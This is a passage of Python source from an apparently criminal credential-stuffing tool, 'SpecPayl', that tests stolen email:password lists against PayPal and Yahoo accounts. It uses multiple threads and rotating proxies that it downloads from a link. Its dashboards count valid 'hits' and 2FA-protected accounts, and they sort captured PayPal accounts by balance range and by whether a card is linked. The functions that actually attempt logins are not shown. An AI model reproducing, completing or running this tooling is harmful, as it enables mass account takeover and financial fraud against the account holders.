        print(f"{Fore.LIGHTGREEN_EX}[+] {email}:{password} | {data}")
    else:
        print(f"{Fore.LIGHTGREEN_EX}[+] {email}:{password} | {data}")
def PrintExpires(email, password, data):
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    if "GUICensure" == "ON":
        password = '*'*len(password)
        print(f"{Fore.YELLOW}[/] {email}:{password} | {data}")
    else:
        print(f"{Fore.YELLOW}[/] {email}:{password} | {data}")
def PrintFree(email, password):
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    if "GUICensure" == "ON":
        password = '*'*len(password)
        print(f"{Fore.LIGHTYELLOW_EX}[*] {email}:{password}")
    else:
        print(f"{Fore.LIGHTYELLOW_EX}[*] {email}:{password}")
def PrintInvalids(email, password):
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    if "OFF" in GUIShowInvalids:
        pass
    else:
        print(f"{Fore.RED}[-] {email}:{password}")


def aActualizePaypalCap1():
    while True:
        global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
        xd = threading.active_count()
        os.system("cls")
        print(logo)
        print(f"\n                                                    [{Fore.CYAN}CUI MODE{Fore.LIGHTBLACK_EX}]")
        print(f"                                    [{Fore.CYAN}Dev: IzLoki#5893 | Module: Paypal #1 [Capture] | v0.6.6{Fore.LIGHTBLACK_EX}]")  
        print(f"\n\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Hits:     {Fore.BLUE}| {Fore.LIGHTGREEN_EX}{hits}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}2FA:      {Fore.BLUE}| {Fore.YELLOW}{free}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Bads:     {Fore.BLUE}| {Fore.RED}{bads}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Total:    {Fore.BLUE}| {Fore.LIGHTBLUE_EX}{checked} {Fore.LIGHTBLACK_EX}/ {Fore.LIGHTBLUE_EX}{len(accounts)}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}CPM:      {Fore.BLUE}| {Fore.MAGENTA}{nowcpm}")
        print()
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}w/Balance:   {Fore.BLUE}| {Fore.WHITE}{wbalance}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}w/Card:      {Fore.BLUE}| {Fore.WHITE}{yescard}")
        print()
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}0$ - 10$:    {Fore.BLUE}| {Fore.WHITE}{b0to10}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}10$ - 50$:   {Fore.BLUE}| {Fore.WHITE}{b10to50}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}50$ - 100$:  {Fore.BLUE}| {Fore.WHITE}{b50to100}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}100$ - 500$: {Fore.BLUE}| {Fore.WHITE}{b100to500}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}500$ - 1k$:  {Fore.BLUE}| {Fore.WHITE}{b500to1000}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}More of 1k$: {Fore.BLUE}| {Fore.WHITE}{b1000more}")
        print(f"\033[1;36;40m  {flecha}  " + Fore.LIGHTBLACK_EX + "Retries: [" + Fore.LIGHTRED_EX + "{}".format(error) + Fore.LIGHTBLACK_EX + "]")
        if os.path.exists("results/Yahoo #1/{}/KEYWORDERROR.txt".format(current_date)):
            print(f"\n\033[1;36;40m  {flecha}  " + Fore.RED + "IMPORTANT! CHECK RESULTS FOLDER AND SEND KEYWORDERROR.TXT TO IZLOKI")
            print(f"\033[1;36;40m  {flecha}  " + Fore.RED + "               TO IMPROVE CHECKRR SPEED")
        print()
        print()
        time.sleep(5)
def ActualizePaypalCap1():
    global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard,expires
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    ctypes.windll.kernel32.SetConsoleTitleW(f'SpecPayl |v0.7.1| <-> Paypal #1 [Capture] <-> Hits: {hits} | w/Card: {yescard} | w/Balance: {wbalance} | Expired/NoCard: {expires} | 2FA: {free} | Invalids: {bads} | Checked: {checked} | CPM: {nowcpm}')
def ActualizePaypalCap2():
    while True:
        global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
        xd = threading.active_count()
        os.system("cls")
        print(logo)
        print(f"\n                                                    [{Fore.CYAN}CUI MODE{Fore.LIGHTBLACK_EX}]")
        print(f"                                    [{Fore.CYAN}Dev: IzLoki#5893 | Module: Paypal #2 [Capture] | v0.6.6{Fore.LIGHTBLACK_EX}]")  
        print(f"\n\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Hits:     {Fore.BLUE}| {Fore.LIGHTGREEN_EX}{hits}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}2FA:      {Fore.BLUE}| {Fore.YELLOW}{free}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Bads:     {Fore.BLUE}| {Fore.RED}{bads}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Total:    {Fore.BLUE}| {Fore.LIGHTBLUE_EX}{checked} {Fore.LIGHTBLACK_EX}/ {Fore.LIGHTBLUE_EX}{len(accounts)}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}CPM:      {Fore.BLUE}| {Fore.MAGENTA}{nowcpm}")
        print()
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}w/Balance:   {Fore.BLUE}| {Fore.WHITE}{wbalance}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}w/Card:      {Fore.BLUE}| {Fore.WHITE}{yescard}")
        print()
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}0$ - 10$:    {Fore.BLUE}| {Fore.WHITE}{b0to10}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}10$ - 50$:   {Fore.BLUE}| {Fore.WHITE}{b10to50}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}50$ - 100$:  {Fore.BLUE}| {Fore.WHITE}{b50to100}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}100$ - 500$: {Fore.BLUE}| {Fore.WHITE}{b100to500}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}500$ - 1k$:  {Fore.BLUE}| {Fore.WHITE}{b500to1000}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}More of 1k$: {Fore.BLUE}| {Fore.WHITE}{b1000more}")
        print(f"\033[1;36;40m  {flecha}  " + Fore.LIGHTBLACK_EX + "Retries: [" + Fore.LIGHTRED_EX + "{}".format(error) + Fore.LIGHTBLACK_EX + "]")
        if os.path.exists("results/Yahoo #1/{}/KEYWORDERROR.txt".format(current_date)):
            print(f"\n\033[1;36;40m  {flecha}  " + Fore.RED + "IMPORTANT! CHECK RESULTS FOLDER AND SEND KEYWORDERROR.TXT TO IZLOKI")
            print(f"\033[1;36;40m  {flecha}  " + Fore.RED + "               TO IMPROVE CHECKRR SPEED")
        print()
        print()
        time.sleep(5)
def ActualizePaypalNoCap1():
    while True:
        global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
        xd = threading.active_count()
        os.system("cls")
        print(logo)
        print(f"\n                                                    [{Fore.CYAN}CUI MODE{Fore.LIGHTBLACK_EX}]")
        print(f"                                  [{Fore.CYAN}Dev: IzLoki#5893 | Module: Paypal #1 [No Capture] | v0.6.6{Fore.LIGHTBLACK_EX}]")  
        print(f"\n\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Hits:     {Fore.BLUE}| {Fore.LIGHTGREEN_EX}{hits}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}2FA:      {Fore.BLUE}| {Fore.YELLOW}{free}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Bads:     {Fore.BLUE}| {Fore.RED}{bads}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Total:    {Fore.BLUE}| {Fore.LIGHTBLUE_EX}{checked} {Fore.LIGHTBLACK_EX}/ {Fore.LIGHTBLUE_EX}{len(accounts)}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}CPM:      {Fore.BLUE}| {Fore.MAGENTA}{nowcpm}")
        print()
        print(f"\033[1;36;40m  {flecha}  " + Fore.LIGHTBLACK_EX + "Retries: [" + Fore.LIGHTRED_EX + "{}".format(error) + Fore.LIGHTBLACK_EX + "]")
        if os.path.exists("results/Yahoo #1/{}/KEYWORDERROR.txt".format(current_date)):
            print(f"\n\033[1;36;40m  {flecha}  " + Fore.RED + "IMPORTANT! CHECK RESULTS FOLDER AND SEND KEYWORDERROR.TXT TO IZLOKI")
            print(f"\033[1;36;40m  {flecha}  " + Fore.RED + "               TO IMPROVE CHECKRR SPEED")
        print()
        print()
        time.sleep(5)
def ActualizePaypalNoCap2():
    while True:
        global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
        xd = threading.active_count()
        os.system("cls")
        print(logo)
        print(f"\n                                                    [{Fore.CYAN}CUI MODE{Fore.LIGHTBLACK_EX}]")
        print(f"                                  [{Fore.CYAN}Dev: IzLoki#5893 | Module: Paypal #2 [No Capture] | v0.6.6{Fore.LIGHTBLACK_EX}]")  
        print(f"\n\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Hits:     {Fore.BLUE}| {Fore.LIGHTGREEN_EX}{hits}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}2FA:      {Fore.BLUE}| {Fore.YELLOW}{free}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Bads:     {Fore.BLUE}| {Fore.RED}{bads}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}Total:    {Fore.BLUE}| {Fore.LIGHTBLUE_EX}{checked} {Fore.LIGHTBLACK_EX}/ {Fore.LIGHTBLUE_EX}{len(accounts)}")
        print(f"\033[1;36;40m                                          {flecha}  {Fore.LIGHTBLACK_EX}CPM:      {Fore.BLUE}| {Fore.MAGENTA}{nowcpm}")
        print()
        print(f"\033[1;36;40m  {flecha}  " + Fore.LIGHTBLACK_EX + "Retries: [" + Fore.LIGHTRED_EX + "{}".format(error) + Fore.LIGHTBLACK_EX + "]")
        if os.path.exists("results/Yahoo #1/{}/KEYWORDERROR.txt".format(current_date)):
            print(f"\n\033[1;36;40m  {flecha}  " + Fore.RED + "IMPORTANT! CHECK RESULTS FOLDER AND SEND KEYWORDERROR.TXT TO IZLOKI")
            print(f"\033[1;36;40m  {flecha}  " + Fore.RED + "               TO IMPROVE CHECKRR SPEED")
        print()
        print()
        time.sleep(5)
def ActualizeYahoo():
    while True:
        global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
        xd = threading.active_count()
        os.system("cls")
        print(logo)
        print(f"\n                                                    [{Fore.CYAN}CUI MODE{Fore.LIGHTBLACK_EX}]")
        print(f"                                      [{Fore.CYAN}Dev: IzLoki#5893 | Module: Yahoo #1 | v2.0{Fore.LIGHTBLACK_EX}]")  
        print(f"\n\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Hits: [{Fore.LIGHTGREEN_EX}{hits}{Fore.LIGHTBLACK_EX}]")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}2FA:  [{Fore.YELLOW}{free}{Fore.LIGHTBLACK_EX}]")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Bads: [{Fore.RED}{bads}{Fore.LIGHTBLACK_EX}]")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Flag: [{Fore.CYAN}{flagged}{Fore.LIGHTBLACK_EX}]")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Total [{Fore.LIGHTBLUE_EX}{checked} {Fore.LIGHTBLACK_EX}/ {Fore.LIGHTBLUE_EX}{len(accounts)}{Fore.LIGHTBLACK_EX}]")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}CPM:  [{Fore.MAGENTA}{nowcpm}{Fore.LIGHTBLACK_EX}]")
        print()
        print(f"\033[1;36;40m  {flecha}  " + Fore.LIGHTBLACK_EX + "Retries: [" + Fore.LIGHTRED_EX + "{}".format(error) + Fore.LIGHTBLACK_EX + "]")
        if os.path.exists("results/Yahoo #2/{}/KEYWORDERROR.txt".format(current_date)):
            print(f"\n\033[1;36;40m  {flecha}  " + Fore.RED + "IMPORTANT! CHECK RESULTS FOLDER AND SEND KEYWORDERROR.TXT TO IZLOKI")
            print(f"\033[1;36;40m  {flecha}  " + Fore.RED + "               TO IMPROVE CHECKRR SPEED")
        print()
        print()
        time.sleep(5)
def ActualizePaypalVM():
    while True:
        global hits, bads, free, checked, error, nowcpm, accounts, flagged, accounts
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
        xd = threading.active_count()
        os.system("cls")
        print(logo)
        print(f"\n                                                    [{Fore.CYAN}CUI MODE{Fore.LIGHTBLACK_EX}]")
        print(f"                                      [{Fore.CYAN}Dev: IzLoki#5893 | Module: PaypalVM | v0.6.6{Fore.LIGHTBLACK_EX}]")  
        print(f"\n\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Hits: {Fore.BLUE}| {Fore.LIGHTGREEN_EX}{hits}")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Bads: {Fore.BLUE}| {Fore.RED}{bads}")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Flag: {Fore.BLUE}| {Fore.CYAN}{flagged}")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}Total {Fore.BLUE}| {Fore.LIGHTBLUE_EX}{checked} {Fore.LIGHTBLACK_EX}/ {Fore.LIGHTBLUE_EX}{len(accounts)}")
        print(f"\033[1;36;40m                                                 {flecha}  {Fore.LIGHTBLACK_EX}CPM:  {Fore.BLUE}| {Fore.MAGENTA}{nowcpm}")
        print()
        print(f"\033[1;36;40m  {flecha}  " + Fore.LIGHTBLACK_EX + "Retries: [" + Fore.LIGHTRED_EX + "{}".format(error) + Fore.LIGHTBLACK_EX + "]")
        if os.path.exists("results/Yahoo #2/{}/KEYWORDERROR.txt".format(current_date)):
            print(f"\n\033[1;36;40m  {flecha}  " + Fore.RED + "IMPORTANT! CHECK RESULTS FOLDER AND SEND KEYWORDERROR.TXT TO IZLOKI")
            print(f"\033[1;36;40m  {flecha}  " + Fore.RED + "               TO IMPROVE CHECKRR SPEED")
        print()
        print()
        time.sleep(5)


def cpmcount():
    global cpm, nowcpm, accounts, xddd, time2
    ct = datetime.datetime.now()
    if xddd == 0:
        time2 = ct.timestamp()
        xddd = 1
    ts2 = ct.timestamp()
    if time2+5 < ts2:
        nowcpm = cpm*12
        cpm = 0
        xddd = 0
def resetchecker():
    while True:
        try:
            if keyboard.read_key() == "s":

                global checked, accounts, proxylist
                textfile = open("ReamingSaved.txt", "w", encoding='utf'.strip())
                textfile.write("")
                notchecked = accounts[int(checked):]
                for line in notchecked:
                    textfile.write(line + "\n")
                textfile.close()
                continue
        except Exception as e:
            textfile = open("ReamingSaved.txt", "w")
            textfile.write("")
            notchecked = accounts[int(checked):]
            for line in notchecked:
                textfile.write(line + "\n")
            textfile.close()
            continue
def Grabber():
    global proxylist, xdd, time3
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    ct = datetime.datetime.now()
    if xdd == 0:
        time3 = ct.timestamp()
        xdd = 1
    ts3 = ct.timestamp()
    if time3+600 < ts3:
        try:
            xd = requests.get(ProxyLink)
            xd = str(xd.content).split("\\r\\n")
            proxylist = xd
            xdd == 0
        except Exception as e:
            print("Error to Scrappe Proxys.")

def Pipenv():
    global emails, passwords, proxylist
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    retry = 0
    emails.clear()
    passwords.clear()
    proxylist.clear()
    if not os.path.exists('results'):
        os.makedirs('results')
        os.makedirs('results/YahooInbox')
        os.makedirs('results/Yahoo')
    #load_params()
    os.system("cls")
    print(logo)
    print()
    print(f"\033[1;36;40m  {flecha}  \033[1;30;40m[Select Modules]\n")
    #time.sleep(5)
    print()
    print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[1] \033[1;30;40mPaypal #1 [Full capture | CaptchaLess]")
    print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[2] \033[1;30;40mPaypal #1 [No Capture   | CaptchaLess]")
    print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[3] \033[1;30;40mPaypalVM [HQ]")
    print()
    print()
    print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[M] \033[1;30;40mOptions")
    print()
    print()
    selected = input(f"\033[1;36;40m{flecha} \033[1;30;40mSelect: ")
    if selected == "1":
        if not os.path.exists('results/Paypal #1/{}'.format(current_date)):
            os.makedirs('results/Paypal #1/{}'.format(current_date))
        PyBrain("them2023mh")
        if not "null" in proxy_type: 
            messageboxer("them2023mh")
        threading.Thread(target=actualizesess).start()
        print("\nGenerating TOKENS...")
        print("this may take time depending of your proxies")
        ctypes.windll.kernel32.SetConsoleTitleW('SpecPayl - UHQ | Paypal | LOADING | Dev By: IzLoki#5893')
        while True:
            time.sleep(1)
            global ppsessid, ppaccestoken
            if "1" in ppsessid or "2" in ppsessid or "a" in ppsessid or "b" in ppsessid:
                os.system("cls")
                print(logo)
                print(f"\nStarting:")
                break
            else:
                print(ppsessid)
                continue
        ctypes.windll.kernel32.SetConsoleTitleW('SpecPayl - UHQ | Paypal | Dev By: IzLoki#5893')
        threading.Thread(target=ActualizePaypalCap1).start()
        mainpool = ThreadPool(processes=int(threads))
        os.system("cls")
        print(logo)
        print()
        mainpool.map(PaypalCap1, accounts)
    elif selected == "2":
        if not os.path.exists('results/Paypal #1/{}'.format(current_date)):
            os.makedirs('results/Paypal #1/{}'.format(current_date))
        PyBrain("them2023mh")
        if not "null" in proxy_type: 
            messageboxer("them2023mh")
        ctypes.windll.kernel32.SetConsoleTitleW('SpecPayl - UHQ | Paypal No Capture | Dev By: IzLoki#5893')
        threading.Thread(target=ActualizePaypalNoCap1).start()
        mainpool = ThreadPool(processes=int(threads))
        os.system("cls")
        print(logo)
        print()
        mainpool.map(PaypalNoCap1, accounts)
    elif selected == "3":
        if not os.path.exists('results/PaypalVM/{}'.format(current_date)):
            os.makedirs('results/PaypalVM/{}'.format(current_date))
        PyBrain("them2023mh")
        if not "null" in proxy_type: 
            messageboxer("them2023mh")
        ctypes.windll.kernel32.SetConsoleTitleW('SpecPayl - UHQ | PaypalVM | Dev By: IzLoki#5893')
        threading.Thread(target=ActualizePaypalVM).start()
        mainpool = ThreadPool(processes=int(threads))
        mainpool.map(PaypalVM, accounts)
    elif selected == "55":
        if not os.path.exists('results/Yahoo #1/{}'.format(current_date)):
            os.makedirs('results/Yahoo #1/{}'.format(current_date))
        PyBrain("them2023mh")
        if not "null" in proxy_type: 
            messageboxer("them2023mh")
        ctypes.windll.kernel32.SetConsoleTitleW('SpecPayl - UHQ | Yahoo #1 | Dev By: IzLoki#5893')
        threading.Thread(target=ActualizeYahoo).start()
        mainpool = ThreadPool(processes=int(threads))
        mainpool.map(Yahoo, accounts)
    elif selected == "M" or selected == "m":
        options()
    else:
        print("Please select valid option ")
        time.sleep(2)
        Pipenv()
uuidran("them2023mh")